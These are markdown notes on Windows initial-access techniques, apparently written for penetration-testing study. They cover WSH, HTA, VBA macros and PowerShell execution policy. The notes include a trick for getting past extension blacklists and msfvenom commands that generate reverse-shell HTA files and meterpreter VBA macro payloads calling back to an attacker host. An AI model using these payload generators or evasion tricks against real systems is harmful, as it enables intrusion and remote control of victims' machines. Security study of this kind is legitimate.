---
title: Windows initial foothold notes
---

- [1. Windows Scripting Host (WSH)](#1-windows-scripting-host-wsh)
- [2. HTML Application (HTA)](#2-html-application-hta)
- [3. Visual Basic for Application (VBA)](#3-visual-basic-for-application-vba)
- [4. Powershell script](#4-powershell-script)

## 1. Windows Scripting Host (WSH)
WSH is language-independent technology to run scripts written in Active Scripting languages. It's old and available on every Windows machine by default. Users can install different scripting engines to support different scripting languages (e.g. PerlScript, RubyScript).

Engines to run JScript (`.js` file) and VBScript (`.vbs` file) are installed by default. Administrator can also use `.wsf` file (_Windows Scripting File_) in order to mix different scripting languages in one scripting file. Windows OS runs scripts with the same level of access and permission as a regular user.

> **TRICK**: VBScript file might be renamed to `example.txt` and executed using the following command: `wscript /e:VBScript <path-to-script>`. This trick can bypass file extension blacklists.

```powershell
# Console application
cscript <path-to-console-script>

# Window application
wscript <path-to-window-script>
```

## 2. HTML Application (HTA)
HTA is a Windows program whose source code consists of HTML, CSS and one or more scripting languages supported by WSH - JScript and VBScript. Actually it works like a Windows program with GUI written in HTML and logic written in scripting language. Because it's executed locally, it's often used as a GUI for administration tools. The usual HTA file extension is `.hta`.

HTAs are interpreted by mshta.exe (LOLBin) after double clicking. Under the hood it is rendered by Internet Explorer (officially: _Trident_ engine, called _MSHTML_ as well) browser engine even if IE is not installed in the OS (still works in Windows 11).

HTAs files often can be executed immediately after download. Because of that they are used to establish reverse shell by attackers. `msvenom` and `msfconsole` have a generators of HTA rev-shell files.

```bash
# Generate malicious HTA file
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ip> LPORT=<port> -f hta-psh -o rev-shell.hta
```

## 3. Visual Basic for Application (VBA)
VBA is almost the same as Visual Basic but its main purpose is to automate tasks in Microsoft Office applications (Word, Excel, PowerPoint, Outlook etc.). It cannot work independently. Macros are written in VBA. They can be combined with HTA and WSH methods to bypass more detection softwares.

```bash
# Generate malicious VBA macro payload
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ip> LPORT=<port> -f vba
```

## 4. Powershell script
PS execution policy is by default set to `Restriced`. It means that user can execute single commands but not to run any PS script (`.ps1` file).

```powershell
# Check current execution policy
Get-ExecutionPolicy

# Change current execution policy
Set-ExecutionPolicy -Scope CurrentUser RemoteSigned
```
